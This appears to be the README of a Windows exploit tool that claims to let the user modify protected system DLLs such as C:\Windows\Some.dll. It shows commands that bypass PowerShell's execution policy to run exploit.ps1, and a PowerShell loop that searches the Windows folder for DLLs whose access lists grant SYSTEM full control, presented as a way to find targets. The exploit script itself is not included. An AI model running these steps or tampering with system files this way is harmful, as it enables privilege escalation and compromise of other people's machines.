# Usage
```
Set-ExecutionPolicy Bypass Process
.\exploit.ps1 -TargetFile C:\Windows\Some.dll
```
This will exploit the Windows operating system allowing you to modify the file Some.dll.

# Example
```
Set-ExecutionPolicy Bypass Process
.\example.ps1
```
https://youtu.be/rNSpxJd3_BM
# Finding Vulnerable DLL files
```
$aapsid = 'NT AUTHORITY\SYSTEM'

ForEach($file in (Get-ChildItem -File -recurse -Path 'C:\windows' -Filter *.dll -ErrorAction SilentlyContinue)) {
 
   $acl = Get-Acl -path $file.FullName
   ForEach($ace in $acl.Access) {
      If(($ace.FileSystemRights -eq
           [Security.AccessControl.FileSystemRights]::FullControl) -and 
            $ace.IdentityReference.Value -in $aapsid) {
               Write-Output $file.FullName
              
      }
        
   }
   
   }
```


___


I have only tested this on Windows 10, in theory it should work on other versions.
